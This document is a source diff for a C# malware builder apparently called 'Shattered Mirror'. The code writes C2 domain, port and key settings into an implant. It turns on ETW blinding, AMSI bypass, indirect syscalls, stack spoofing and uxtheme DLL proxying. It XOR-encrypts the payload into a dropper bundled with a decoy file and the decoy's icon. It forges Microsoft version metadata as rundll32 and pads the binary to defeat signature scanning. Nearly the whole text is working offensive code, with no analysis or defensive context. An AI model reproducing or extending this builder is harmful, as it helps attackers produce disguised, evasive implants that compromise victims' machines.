@@ -7,7 +7,7 @@ using System.Linq;
 using System.Collections.Generic;
 using System.Threading;
 
-namespace ShatteredMirror_Builder
+namespace Builder_GUI
 {
     public class PayloadCompiler
     {
@@ -17,6 +17,9 @@ namespace ShatteredMirror_Builder
         private string _c2Domain;
         private string _c2Port;
         private string _c2Seed;
+        private string[] _selectedAtoms;
+        private string _autoStartOrder;
+        private string _failoverUrl;
         public string DecoyPath { get; set; } = "";
         public StringBuilder BuildLogs { get; private set; } = new StringBuilder();
 
@@ -24,16 +27,49 @@ namespace ShatteredMirror_Builder
             BuildLogs.AppendLine(msg);
         }
 
+        private bool _enableEtw;
+        private bool _enableAmsi;
+        private bool _enableStack;
+        private bool _enablePayload;
+        private bool _enableIndirect;
+        private bool _enableIpc;
+        private bool _enableProxy;
+        private bool _enableManager;
+        private bool _enableVeh;
+        private bool _enableCleanup;
+        private bool _enableBloat;
+        private bool _enableSpoof;
+
         public PayloadCompiler(string sourceDir = "..", string outputDir = ".\\Output", string decoyFile = "", 
-                               string c2Domain = "c2.attacker.com", string c2Port = "443", string c2Seed = "SuperSecretSeedForClient001")
+                               string c2Domain = "127.0.0.1", string c2Port = "6969", string c2Seed = "SuperSecretSeedForClient001", 
+                               string[]? selectedAtoms = null, string autoStartOrder = "4, 12, 1", string failoverUrl = "",
+                               bool enableEtw = true, bool enableAmsi = true, bool enableStack = true,
+                               bool enablePayload = true, bool enableIndirect = true,
+                               bool enableIpc = true, bool enableProxy = true, bool enableManager = true,
+                               bool enableVeh = true, bool enableCleanup = true, bool enableBloat = false, bool enableSpoof = false)
         {
             _sourceDir = Path.GetFullPath(sourceDir);
             _outputDir = Path.GetFullPath(outputDir);
             _decoyFile = string.IsNullOrEmpty(decoyFile) ? "" : Path.GetFullPath(decoyFile);
             DecoyPath = _decoyFile;
-            _c2Domain = c2Domain;
+            _c2Domain = c2Domain.Replace("http://", "").Replace("https://", "").TrimEnd('/');
             _c2Port = c2Port;
             _c2Seed = c2Seed;
+            _selectedAtoms = selectedAtoms ?? new string[] { "1", "4", "6", "12", "14" };
+            _autoStartOrder = autoStartOrder;
+            _failoverUrl = failoverUrl;
+            _enableEtw = enableEtw;
+            _enableAmsi = enableAmsi;
+            _enableStack = enableStack;
+            _enablePayload = enablePayload;
+            _enableIndirect = enableIndirect;
+            _enableIpc = enableIpc;
+            _enableProxy = enableProxy;
+            _enableManager = enableManager;
+            _enableVeh = enableVeh;
+            _enableCleanup = enableCleanup;
+            _enableBloat = enableBloat;
+            _enableSpoof = enableSpoof;
         }
 
         public bool BuildPayload()
@@ -51,15 +87,61 @@ namespace ShatteredMirror_Builder
             Log($"[*] Generated XOR key (Decoy): {xorKey}");
             Log($"[*] Generated XOR key (Payload): {payloadXorKey}");
 
+            string batPath = "";
             try {
                 // 2. Perform dynamic configuration injection into Config.h
-                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\* C2_DOMAIN = ""([^""]+)""", $@"static const char* C2_DOMAIN = ""{_c2Domain}""");
-                RegexReplaceInFile("Orchestrator\\Config.h", @"static const int   C2_PORT   = (\d+)", $@"static const int   C2_PORT   = {_c2Port}");
-                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\* PSK_SEED = ""([^""]+)""", $@"static const char* PSK_SEED = ""{_c2Seed}""");
-                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\* PSK_ID     = ""([^""]+)""", $@"static const char* PSK_ID     = ""{sessionKey}""");
+                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\* C2_DOMAIN\s*=\s*""([^""]+)""", $@"static const char* C2_DOMAIN  = ""{_c2Domain}""");
+                RegexReplaceInFile("Orchestrator\\Config.h", @"static const int\s*PUBLIC_PORT\s*=\s*(\d+)", $@"static const int   PUBLIC_PORT = {_c2Port}");
+                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\* PSK_SEED\s*=\s*""([^""]+)""", $@"static const char* PSK_SEED   = ""{_c2Seed}""");
+                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\* PSK_ID\s*=\s*""([^""]+)""", $@"static const char* PSK_ID     = ""{sessionKey}""");
                 
-                // Inject the build-specific session key into EVERYTHING
-                RegexReplaceInFile("C2_Backend\\listener.py", @"TARGET_SEED = b""([^""]+)""", $@"TARGET_SEED = b""{_c2Seed}""");
+                // Dynamically inject the user's custom auto-start sequence
+                string autoStartSequence = string.IsNullOrEmpty(_autoStartOrder) ? "0" : _autoStartOrder;
+                RegexReplaceInFile("Orchestrator\\Config.h", @"static const DWORD AUTO_START_ATOMS\[\]\s*=\s*\{[^}]*\};", $@"static const DWORD AUTO_START_ATOMS[] = {{{autoStartSequence}}};");
+
+
+
+                // Inject failover URL if provided
+                if (!string.IsNullOrEmpty(_failoverUrl)) {
+                    RegexReplaceInFile("Orchestrator\\Config.h", @"static const char \*FAILOVER_URL\s*=\s*""([^""]+)""", $@"static const char *FAILOVER_URL = ""{_failoverUrl}""");
+                    Log($"[*] Failover URL: {_failoverUrl}");
+                }
+
+                // Inject preprocessor macros to enable the selected atoms so unselected ones are completely excluded.
+                string configPath = Path.Combine(_sourceDir, "Orchestrator\\Config.h");
+                string configContent = File.ReadAllText(configPath);
+                configContent = System.Text.RegularExpressions.Regex.Replace(configContent, @"#define ATOM_\d+_ENABLED\r?\n", "");
+                configContent = System.Text.RegularExpressions.Regex.Replace(configContent, @"#define FEATURE_\w+_ENABLED\r?\n", "");
+                
+                StringBuilder defines = new StringBuilder();
+                foreach(string atomId in _selectedAtoms) {
+                    defines.AppendLine($"#define ATOM_{atomId}_ENABLED");
+                }
+                
+                if (_enableEtw) defines.AppendLine("#define FEATURE_ETW_BLIND_ENABLED");
+                if (_enableAmsi) defines.AppendLine("#define FEATURE_AMSI_BYPASS_ENABLED");
+                if (_enableStack) defines.AppendLine("#define FEATURE_STACK_SPOOF_ENABLED");
+                if (_enableIndirect) defines.AppendLine("#define FEATURE_INDIRECT_SYSCALLS_ENABLED");
+                if (_enableIpc) defines.AppendLine("#define FEATURE_IPC_CHANNEL_ENABLED");
+                if (_enableProxy) defines.AppendLine("#define FEATURE_PROXY_LOGIC_ENABLED");
+                if (_enableManager) defines.AppendLine("#define FEATURE_ATOM_MANAGER_ENABLED");
+                if (_enableVeh) defines.AppendLine("#define FEATURE_VEH_HANDLER_ENABLED");
+
+                File.WriteAllText(configPath, configContent + "\r\n" + defines.ToString());
+
+                // Update the boolean constants in Config.h as well for runtime checks
+                RegexReplaceInFile("Orchestrator\\Config.h", @"static const bool ENABLE_ETW_BLIND\s*=\s*\w+;", $@"static const bool ENABLE_ETW_BLIND = {(_enableEtw ? "true" : "false")};");
+                RegexReplaceInFile("Orchestrator\\Config.h", @"static const bool ENABLE_AMSI_BYPASS\s*=\s*\w+;", $@"static const bool ENABLE_AMSI_BYPASS = {(_enableAmsi ? "true" : "false")};");
+                RegexReplaceInFile("Orchestrator\\Config.h", @"static const bool ENABLE_STACK_SPOOF\s*=\s*\w+;", $@"static const bool ENABLE_STACK_SPOOF = {(_enableStack ? "true" : "false")};");
+
+                // Inject payload extraction toggle into Dropper template
+                string dropperPath = Path.Combine(_sourceDir, "Builder_GUI\\Dropper_Template.cpp");
+                string dropperContent = File.ReadAllText(dropperPath);
+                dropperContent = System.Text.RegularExpressions.Regex.Replace(dropperContent, @"#define FEATURE_PAYLOAD_EXTRACTION_ENABLED\r?\n", "");
+                if (_enablePayload) dropperContent = "#define FEATURE_PAYLOAD_EXTRACTION_ENABLED\r\n" + dropperContent;
+                File.WriteAllText(dropperPath, dropperContent);
+
+                // Inject build keys into Dropper template
                 RegexReplaceInFile("Builder_GUI\\Dropper_Template.cpp", @"#define PAYLOAD_KEY ""([^""]+)""", $@"#define PAYLOAD_KEY ""{payloadXorKey}""");
                 RegexReplaceInFile("Builder_GUI\\Dropper_Template.cpp", @"#define DECOY_KEY ""([^""]+)""", $@"#define DECOY_KEY ""{xorKey}""");
 
@@ -72,27 +154,29 @@ namespace ShatteredMirror_Builder
                     }
                 }
 
-                // 3. Prepare the Dynamic Proxy Header (No more manual guessing!)
-                Log("[*] Dynamically resolving UXTheme exports from system...");
-                ResolveDynamicExports();
+                // 3. Prepare the Dynamic Proxy Header (Only if enabled)
+                if (_enableProxy) {
+                    Log("[*] Dynamically resolving UXTheme exports from system...");
+                    ResolveDynamicExports();
+                }
 
-                // 4. Prepare the Decoy File
-                if (!string.IsNullOrEmpty(DecoyPath) && File.Exists(DecoyPath)) {
+                // 4. Prepare the Decoy File (or empty payload if none)
+                bool hasDecoy = !string.IsNullOrEmpty(DecoyPath) && File.Exists(DecoyPath);
+                if (hasDecoy) {
                     Log($"[*] Embedding user decoy: {Path.GetFileName(DecoyPath)}");
                     PrepareDecoy(xorKey, DecoyPath);
                 } else {
                     Log("[*] No decoy selected. Building silent payload.");
-                    File.WriteAllBytes(Path.Combine(_sourceDir, "payload.bin"), new byte[0]); // Empty decoy
+                    PrepareEmptyDecoy();
                 }
 
-                // 4. Generate the build script that compiles and encrypts everything
+                // 5. Generate the build script that compiles and encrypts everything
                 string buildScript = GenerateBuildBat(payloadXorKey);
-                string batPath = Path.Combine(_sourceDir, "_shattered_build_tmp.bat");
+                batPath = Path.Combine(_sourceDir, "_shattered_build_tmp.bat");
                 File.WriteAllText(batPath, buildScript);
                 Log("[+] Generated temporary build pipeline.");
 
-
-                // 5. Automatically Run the Build (One-Click Magic)
+                // 6. Automatically Run the Build (One-Click Magic)
                 Log("[*] Executing Compiler Pipeline (This may take a moment)...");
                 ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", $"/c \"\"{batPath}\"\"")
                 {
@@ -123,19 +207,21 @@ namespace ShatteredMirror_Builder
                 
                 Log("[+] Build Pipeline Completed Perfectly.");
                 
-                // 6. Finalize Naming
+                // 7. Finalize Naming
                 string finalExe = Path.Combine(_outputDir, "Shattered_Mirror.exe");
                 string builtExe = Path.Combine(_sourceDir, "Dropper.exe");
                 
                 if (File.Exists(builtExe)) {
-                    // --- FIX: Ensure the output directory actually exists! ---
                     Directory.CreateDirectory(_outputDir);
                     
                     if (File.Exists(finalExe)) File.Delete(finalExe);
                     File.Move(builtExe, finalExe);
                     
-                    // 7. Bloat the final EXE to bypass AI signatures
-                    BloatFile(finalExe);
+                    // 8. Bloat the final EXE if enabled
+                    if (_enableBloat) {
+                        Log("[*] Applying binary bloat for signature randomization...");
+                        BloatFile(finalExe);
+                    }
                     Log($"[+] Payload Ready: {finalExe}");
                 }
                 
@@ -146,6 +232,76 @@ namespace ShatteredMirror_Builder
                 Log($"[!] Build logic failed: {ex.Message}");
                 return false;
             }
+            finally
+            {
+                if (_enableCleanup) CleanupArtifacts(batPath);
+            }
+        }
+
+        private void PrepareEmptyDecoy()
+        {
+            // Create empty decoy.bin (just a single byte to satisfy resource compiler)
+            byte[] empty = new byte[1] { 0x00 };
+            string decoyBinPath = Path.Combine(_sourceDir, "Builder_GUI\\decoy.bin");
+            File.WriteAllBytes(decoyBinPath, empty);
+
+            // Create a professional .rc file with Microsoft metadata (only if spoofing enabled)
+            StringBuilder rcContent = new StringBuilder();
+            rcContent.AppendLine("#include <windows.h>");
+            rcContent.AppendLine("VS_VERSION_INFO VERSIONINFO");
+            rcContent.AppendLine(" FILEVERSION 10,0,19041,1");
+            rcContent.AppendLine(" PRODUCTVERSION 10,0,19041,1");
+            rcContent.AppendLine(" FILEFLAGSMASK 0x3fL");
+            rcContent.AppendLine(" FILEFLAGS 0x0L");
+            rcContent.AppendLine(" FILEOS 0x40004L");
+            rcContent.AppendLine(" FILETYPE 0x1L");
+            rcContent.AppendLine(" FILESUBTYPE 0x0L");
+            rcContent.AppendLine("BEGIN");
+
+            string company = _enableSpoof ? "Microsoft Corporation" : "Shattered Workspace";
+            string desc = _enableSpoof ? "Windows Host Process (Rundll32)" : "Shattered Core Utility";
+            string internalName = _enableSpoof ? "rundll32.exe" : "ShatteredCore.exe";
+
+            rcContent.AppendLine("    BLOCK \"StringFileInfo\"");
+            rcContent.AppendLine("    BEGIN");
+            rcContent.AppendLine("        BLOCK \"040904b0\"");
+            rcContent.AppendLine("        BEGIN");
+            rcContent.AppendLine($"            VALUE \"CompanyName\", \"{company}\"");
+            rcContent.AppendLine($"            VALUE \"FileDescription\", \"{desc}\"");
+            rcContent.AppendLine("            VALUE \"FileVersion\", \"10.0.19041.1 (WinBuild.160101.0800)\"");
+            rcContent.AppendLine($"            VALUE \"InternalName\", \"{internalName}\"");
+            rcContent.AppendLine($"            VALUE \"LegalCopyright\", \"© {company}. All rights reserved.\"");
+            rcContent.AppendLine($"            VALUE \"OriginalFilename\", \"{internalName}\"");
+            rcContent.AppendLine("            VALUE \"ProductName\", \"Microsoft® Windows® Operating System\"");
+            rcContent.AppendLine("            VALUE \"ProductVersion\", \"10.0.19041.1\"");
+            rcContent.AppendLine("        END");
+            rcContent.AppendLine("    END");
+            rcContent.AppendLine("    BLOCK \"VarFileInfo\"");
+            rcContent.AppendLine("    BEGIN");
+            rcContent.AppendLine("        VALUE \"Translation\", 0x409, 1200");
+            rcContent.AppendLine("    END");
+            rcContent.AppendLine("END");
+
+            if (_enablePayload) {
+                rcContent.AppendLine("102 RCDATA \"payload.bin\"");
+            }
+            rcContent.AppendLine("1 RT_MANIFEST \"Builder_GUI\\\\app.manifest\"");
+
+            File.WriteAllText(Path.Combine(_sourceDir, "Builder_GUI\\dropper.rc"), rcContent.ToString());
+
+            // Create a professional manifest (only if spoofing enabled, otherwise generic)
+            string manifestName = _enableSpoof ? "Microsoft.Windows.System.ServiceHost" : "Shattered.Core.Utility";
+            string manifestDesc = _enableSpoof ? "Windows System Service Host" : "Shattered Core Utility";
+
+            string manifest = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n" +
+                               "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\r\n" +
+                               $"<assemblyIdentity name=\"{manifestName}\" processorArchitecture=\"amd64\" version=\"10.0.19041.1\" type=\"win32\"/>\r\n" +
+                               $"<description>{manifestDesc}</description>\r\n" +
+                               "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo>\r\n" +
+                               "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\r\n" +
+                               "<application><supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/></application>\r\n" +
+                               "</compatibility></assembly>";
+            File.WriteAllText(Path.Combine(_sourceDir, "Builder_GUI\\app.manifest"), manifest);
         }
 
 
@@ -153,12 +309,11 @@ namespace ShatteredMirror_Builder
         {
             if (!File.Exists(filePath)) return;
             
-            // Append 5MB of random-looking Junk data at the end (Overlay)
-            // This confuses AI signatures which often scan fixed-offsets.
             using (FileStream fs = new FileStream(filePath, FileMode.Append))
             {
-                byte[] junk = new byte[1024 * 1024 * 5]; // 5MB Bloat
-                new Random().NextBytes(junk);
+                // Use Zeros (low entropy) for bloat, and only 1MB to avoid triggering size-based heuristics
+                byte[] junk = new byte[1024 * 1024 * 1]; 
+                Array.Clear(junk, 0, junk.Length);
                 fs.Write(junk, 0, junk.Length);
             }
         }
@@ -182,7 +337,6 @@ namespace ShatteredMirror_Builder
         {
             try {
                 foreach (var proc in Process.GetProcessesByName("NoteSvc")) proc.Kill();
-                foreach (var proc in Process.GetProcessesByName("VaultSvc")) proc.Kill();
                 foreach (var proc in Process.GetProcessesByName("Shattered_Mirror")) proc.Kill();
                 Thread.Sleep(500);
             } catch { }
@@ -203,21 +357,84 @@ namespace ShatteredMirror_Builder
             byte[] encrypted = XORScale(combined.ToArray(), xorKey);
             File.WriteAllBytes(Path.Combine(_sourceDir, "Builder_GUI\\decoy.bin"), encrypted);
 
-            // Generate resource file with Manifest
-            string rcContent = "101 RCDATA \"Builder_GUI\\\\decoy.bin\"\r\n" +
-                               "102 RCDATA \"payload.bin\"\r\n" +
-                               "1 RT_MANIFEST \"Builder_GUI\\\\app.manifest\"\r\n";
-            File.WriteAllText(Path.Combine(_sourceDir, "Builder_GUI\\dropper.rc"), rcContent);
+            // Extract Icon to match the decoy
+            string iconPath = Path.Combine(_sourceDir, "Builder_GUI\\decoy.ico");
+            if (File.Exists(iconPath)) File.Delete(iconPath);
+            ExtractIconAndSave(filePath, iconPath);
+            
+            // Generate professional resource file with Manifest, VersionInfo and Icon
+            StringBuilder rcContent = new StringBuilder();
+            rcContent.AppendLine("#include <windows.h>");
+            rcContent.AppendLine("VS_VERSION_INFO VERSIONINFO");
+            rcContent.AppendLine(" FILEVERSION 10,0,19041,1");
+            rcContent.AppendLine(" PRODUCTVERSION 10,0,19041,1");
+            rcContent.AppendLine(" FILEFLAGSMASK 0x3fL");
+            rcContent.AppendLine(" FILEFLAGS 0x0L");
+            rcContent.AppendLine(" FILEOS 0x40004L");
+            rcContent.AppendLine(" FILETYPE 0x1L");
+            rcContent.AppendLine(" FILESUBTYPE 0x0L");
+            rcContent.AppendLine("BEGIN");
+            rcContent.AppendLine("    BLOCK \"StringFileInfo\"");
+            rcContent.AppendLine("    BEGIN");
+            rcContent.AppendLine("        BLOCK \"040904b0\"");
+            rcContent.AppendLine("        BEGIN");
+            rcContent.AppendLine("            VALUE \"CompanyName\", \"Microsoft Corporation\"");
+            rcContent.AppendLine("            VALUE \"FileDescription\", \"Windows Host Process (Rundll32)\"");
+            rcContent.AppendLine("            VALUE \"FileVersion\", \"10.0.19041.1 (WinBuild.160101.0800)\"");
+            rcContent.AppendLine("            VALUE \"InternalName\", \"rundll32.exe\"");
+            rcContent.AppendLine("            VALUE \"LegalCopyright\", \"© Microsoft Corporation. All rights reserved.\"");
+            rcContent.AppendLine("            VALUE \"OriginalFilename\", \"rundll32.exe\"");
+            rcContent.AppendLine("            VALUE \"ProductName\", \"Microsoft® Windows® Operating System\"");
+            rcContent.AppendLine("            VALUE \"ProductVersion\", \"10.0.19041.1\"");
+            rcContent.AppendLine("        END");
+            rcContent.AppendLine("    END");
+            rcContent.AppendLine("    BLOCK \"VarFileInfo\"");
+            rcContent.AppendLine("    BEGIN");
+            rcContent.AppendLine("        VALUE \"Translation\", 0x409, 1200");
+            rcContent.AppendLine("    END");
+            rcContent.AppendLine("END");
 
-            // Create a fake, legitimate manifest
+            rcContent.AppendLine("101 RCDATA \"Builder_GUI\\\\decoy.bin\"");
+            rcContent.AppendLine("102 RCDATA \"payload.bin\"");
+            rcContent.AppendLine("1 RT_MANIFEST \"Builder_GUI\\\\app.manifest\"");
+            if (File.Exists(iconPath)) {
+                rcContent.AppendLine("MAINICON ICON \"Builder_GUI\\\\decoy.ico\"");
+            }
+
+            File.WriteAllText(Path.Combine(_sourceDir, "Builder_GUI\\dropper.rc"), rcContent.ToString());
+
+            // Create a professional manifest
             string manifest = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n" +
                               "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\r\n" +
-                              "<assemblyIdentity name=\"ShatteredMirror.App\" processorArchitecture=\"amd64\" version=\"1.0.0.0\" type=\"win32\"/>\r\n" +
+                              "<assemblyIdentity name=\"Microsoft.Windows.System.ServiceHost\" processorArchitecture=\"amd64\" version=\"10.0.19041.1\" type=\"win32\"/>\r\n" +
+                              "<description>Windows System Service Host</description>\r\n" +
+                              "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo>\r\n" +
                               "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\r\n" +
                               "<application><supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/></application>\r\n" +
                               "</compatibility></assembly>";
             File.WriteAllText(Path.Combine(_sourceDir, "Builder_GUI\\app.manifest"), manifest);
         }
+
+        private void ExtractIconAndSave(string filePath, string outIcoPath)
+        {
+            try {
+                string psCommand = "Add-Type -AssemblyName System.Drawing; " +
+                                   "$icon = [System.Drawing.Icon]::ExtractAssociatedIcon('" + filePath.Replace("'", "''") + "'); " +
+                                   "if ($icon -ne $null) { " +
+                                   "  $fs = New-Object System.IO.FileStream('" + outIcoPath.Replace("'", "''") + "', [System.IO.FileMode]::Create); " +
+                                   "  $icon.Save($fs); " +
+                                   "  $fs.Close(); " +
+                                   "}";
+                
+                ProcessStartInfo psi = new ProcessStartInfo("powershell", $"-NoProfile -Command \"{psCommand}\"") {
+                    CreateNoWindow = true, UseShellExecute = false
+                };
+                Process.Start(psi)?.WaitForExit();
+            } catch (Exception ex) {
+                Log($"[!] Icon extraction failed: {ex.Message}");
+            }
+        }
+
 
 
         private string ApplySpoofing()
@@ -225,7 +442,6 @@ namespace ShatteredMirror_Builder
             string finalExe = Path.Combine(_sourceDir, "Dropper.exe");
             if (!File.Exists(finalExe)) return "";
             
-            // Output name is now a standard, pure .exe. No RTLO tricks.
             string newName = "Shattered_Mirror.exe";
             
             string destPath = Path.Combine(_sourceDir, newName);
@@ -240,26 +456,89 @@ namespace ShatteredMirror_Builder
         {
             StringBuilder sb = new StringBuilder();
             sb.AppendLine("@echo off");
-            sb.AppendLine("SET \"VS_PATH=C:\\Program Files (x86)\\Microsoft Visual Studio\\18\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat\"");
-            sb.AppendLine("if not exist \"%VS_PATH%\" ( echo [!] VS Build Tools not found! && exit /b 1 )");
+            // Dynamic VS Build Tools detection via vswhere
+            sb.AppendLine("SET \"VSWHERE=%ProgramFiles(x86)%\\Microsoft Visual Studio\\Installer\\vswhere.exe\"");
+            sb.AppendLine("if not exist \"%VSWHERE%\" (");
+            sb.AppendLine("  echo [!] vswhere.exe not found. Install VS Build Tools.");
+            sb.AppendLine("  exit /b 1");
+            sb.AppendLine(")");
+            sb.AppendLine("for /f \"usebackq tokens=*\" %%i in (`\"%VSWHERE%\" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do set \"VS_INSTALL=%%i\"");
+            sb.AppendLine("if not defined VS_INSTALL (");
+            sb.AppendLine("  echo [!] No VS installation with C++ tools found.");
+            sb.AppendLine("  exit /b 1");
+            sb.AppendLine(")");
+            sb.AppendLine("SET \"VS_PATH=%VS_INSTALL%\\VC\\Auxiliary\\Build\\vcvars64.bat\"");
+            sb.AppendLine("if not exist \"%VS_PATH%\" ( echo [!] vcvars64.bat not found! && exit /b 1 )");
             sb.AppendLine("call \"%VS_PATH%\"");
             sb.AppendLine("");
             sb.AppendLine("echo [*] Compiling Shattered Mirror CORE (ShatteredCore.exe)...");
-            sb.AppendLine("ml64 /c /Fo Evasion_Suite\\IndirectSyscalls.obj Evasion_Suite\\IndirectSyscalls.asm");
-            sb.AppendLine("cl.exe /EHsc /O2 /GS- /I Evasion_Suite\\include ^");
-            sb.AppendLine("Orchestrator\\ProxyLogic.cpp Orchestrator\\VEH_Handler.cpp Orchestrator\\AtomManager.cpp Orchestrator\\IPC_Channel.cpp ^");
-            sb.AppendLine("Evasion_Suite\\src\\*.cpp Atoms\\*.cpp Evasion_Suite\\IndirectSyscalls.obj ^");
-            sb.AppendLine("advapi32.lib winhttp.lib bcrypt.lib user32.lib shell32.lib ^");
+            sb.AppendLine("if not exist \"build\" mkdir build");
+            sb.AppendLine("rc.exe /nologo /i Orchestrator /fo build\\resources.res Orchestrator\\resources.rc");
+
+            if (_enableIndirect)
+            {
+                sb.AppendLine("echo [*] Assembling Indirect Syscalls...");
+                sb.AppendLine("ml64 /c /Fo build\\IndirectSyscalls.obj Evasion_Suite\\IndirectSyscalls.asm");
+            }
+
+            if (!_enableProxy) {
+                sb.AppendLine("echo #include ^<windows.h^> > build\\stub_main.cpp");
+                sb.AppendLine("echo int main() { return 0; } >> build\\stub_main.cpp");
+            }
+
+            sb.AppendLine("cl.exe /EHsc /O2 /GS- /I . /I Evasion_Suite\\include /Fo:build\\ ^");
+            StringBuilder coreFiles = new StringBuilder();
+            if (_enableProxy) coreFiles.Append("Orchestrator\\ProxyLogic.cpp ");
+            else coreFiles.Append("build\\stub_main.cpp ");
+
+            if (_enableVeh) coreFiles.Append("Orchestrator\\VEH_Handler.cpp "); 
+            if (_enableManager) coreFiles.Append("Orchestrator\\AtomManager.cpp ");
+            if (_enableIpc) coreFiles.Append("Orchestrator\\IPC_Channel.cpp ");
+            
+            sb.AppendLine($"{coreFiles.ToString()} ^");
+            
+            StringBuilder evasionFiles = new StringBuilder();
+            evasionFiles.Append("Evasion_Suite\\src\\indirect_syscall.cpp "); 
+            if (_enableEtw) evasionFiles.Append("Evasion_Suite\\src\\etw_blind.cpp ");
+            if (_enableStack) evasionFiles.Append("Evasion_Suite\\src\\stack_encrypt.cpp ");
+
+            StringBuilder atomsList = new StringBuilder();
+            foreach (string atomId in _selectedAtoms) {
+                string idPad = atomId.PadLeft(2, '0');
+                atomsList.Append($"Atoms\\Atom_{idPad}_*.cpp ");
+            }
+
+            string objFile = _enableIndirect ? "build\\IndirectSyscalls.obj " : "";
+            sb.AppendLine($"{evasionFiles.ToString()} {atomsList.ToString()} {objFile} build\\resources.res ^");
+            
+            // Dynamic Library Linking
+            StringBuilder libs = new StringBuilder();
+            libs.Append("user32.lib advapi32.lib shell32.lib "); // Basic libs
+            if (_enableProxy || _enableIpc) libs.Append("ole32.lib ");
+            if (_enableEtw || _enableAmsi || _enablePayload) libs.Append("bcrypt.lib ");
+            if (_enableIpc) libs.Append("winhttp.lib "); // IPC uses winhttp for heartbeats if configured
+
+            sb.AppendLine($"{libs.ToString()} ^");
             sb.AppendLine("/Fe:ShatteredCore.exe");
             sb.AppendLine("");
-            sb.AppendLine($"echo [*] Encrypting Payload (ShatteredCore.exe -> payload.bin)...");
-            sb.AppendLine($"powershell -NoProfile -Command \"$b=[IO.File]::ReadAllBytes('ShatteredCore.exe');$k=[Text.Encoding]::ASCII.GetBytes('{payloadXorKey}');for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor $k[$i %% $k.Length]}};[IO.File]::WriteAllBytes('payload.bin',$b)\"");
-            sb.AppendLine("");
-            sb.AppendLine("if not exist \"payload.bin\" ( echo [!] FAILED: payload.bin missing! && exit /b 1 )");
+
+            if (_enablePayload)
+            {
+                sb.AppendLine($"echo [*] Encrypting Payload (ShatteredCore.exe -> payload.bin)...");
+                sb.AppendLine($"powershell -NoProfile -Command \"$b=[IO.File]::ReadAllBytes('ShatteredCore.exe');$k=[Text.Encoding]::ASCII.GetBytes('{payloadXorKey}');$last=0;for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor ($k[$i %% $k.Length] -bxor $last);$last=$b[$i]}};[IO.File]::WriteAllBytes('payload.bin',$b)\"");
+                sb.AppendLine("");
+                sb.AppendLine("if not exist \"payload.bin\" ( echo [!] FAILED: payload.bin missing! && exit /b 1 )");
+            }
+            else
+            {
+                sb.AppendLine("echo [*] Payload Extraction Disabled. Creating empty decoy payload...");
+                sb.AppendLine("echo [DETACHED] > payload.bin");
+            }
+
             sb.AppendLine("echo [*] Packaging Resources...");
-            sb.AppendLine("rc.exe /nologo /i Builder_GUI Builder_GUI\\dropper.rc");
+            sb.AppendLine("rc.exe /nologo /i Builder_GUI /fo build\\dropper.res Builder_GUI\\dropper.rc");
             sb.AppendLine("echo [*] Compiling Master Stager (Dropper.exe)...");
-            sb.AppendLine("cl.exe /EHsc /O2 /GS- Builder_GUI\\Dropper_Template.cpp Builder_GUI\\dropper.res advapi32.lib shell32.lib user32.lib gdi32.lib comdlg32.lib /Fe:Dropper.exe");
+            sb.AppendLine("cl.exe /EHsc /O2 /GS- /Fo:build\\ Builder_GUI\\Dropper_Template.cpp build\\dropper.res advapi32.lib shell32.lib user32.lib gdi32.lib comdlg32.lib /Fe:Dropper.exe");
 
             sb.AppendLine("echo [*] Build step status: %errorlevel%");
             sb.AppendLine("exit /b 0");
@@ -274,8 +553,6 @@ namespace ShatteredMirror_Builder
             StringBuilder exports = new StringBuilder();
             exports.AppendLine("/* DYNAMICALLY GENERATED BY SHATTERED BUILDER */");
             
-            // To be truly solid, we'll parse the PE exports using a raw byte-reading PowerShell loop.
-            // This avoids any "MethodNotFound" or "LoadLibrary" issues.
             string psCommand = "$ErrorActionPreference = 'Stop'; $file = '" + systemPath + "'; " +
                 "$bytes = [System.IO.File]::ReadAllBytes($file); " +
                 "$offset = [System.BitConverter]::ToInt32($bytes, 0x3C); " +
@@ -311,7 +588,6 @@ namespace ShatteredMirror_Builder
                     string? name = p.StandardOutput.ReadLine();
                     if (!string.IsNullOrEmpty(name))
                     {
-                        // Use a full path EXCLUDING the extension to satisfy the linker's specific path requirements
                         string targetPath = "C:\\\\Windows\\\\System32\\\\uxtheme";
                         exports.AppendLine($"#pragma comment(linker, \"/export:{name}={targetPath}.{name}\")");
                     }
@@ -319,13 +595,11 @@ namespace ShatteredMirror_Builder
                 p.WaitForExit();
             }
 
-            // Also add standard fallback ordinals used by nearly all shells
             for (int ord = 132; ord <= 139; ord++) {
                 string targetPath = "C:\\\\Windows\\\\System32\\\\uxtheme";
                 exports.AppendLine($"#pragma comment(linker, \"/export:#{ord}={targetPath}.#{ord},@{ord},NONAME\")");
             }
 
-            // Inject into ProxyLogic.cpp using a special hook tag
             string proxyPath = Path.Combine(_sourceDir, "Orchestrator\\ProxyLogic.cpp");
             if (File.Exists(proxyPath))
             {
@@ -353,6 +627,62 @@ namespace ShatteredMirror_Builder
                 result[i] = (byte)(data[i] ^ key[i % key.Length]);
             }
             return result;
+        }
+
